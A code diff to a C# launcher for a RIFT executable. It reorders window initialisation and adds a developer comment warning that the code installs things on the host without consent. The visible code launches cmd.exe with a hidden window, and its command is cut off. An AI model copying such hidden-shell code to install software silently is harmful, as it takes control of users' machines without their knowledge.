@@ -24,6 +24,7 @@ namespace launcher
         public static string rift_binarypath = @"Launcher\RIFT\RIFT.exe"; //load this from app.settings later
         public MainWindow()
         {
+            InitializeComponent();
             this.Visibility = Visibility.Hidden;
             if (File.Exists(@"Launcher\cfg\fts.cfg") && File.ReadAllText(@"Launcher\cfg\fts.cfg") == "FN")
             {
@@ -52,8 +53,8 @@ namespace launcher
                 this.Visibility = Visibility.Hidden;
             try
             {
-                InitializeComponent();
                 System.Diagnostics.Process process = new System.Diagnostics.Process();
+                // Replace this! Installing anything on the host system without consent is a bad thing!
                 System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                 startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                 startInfo.FileName = "cmd.exe";
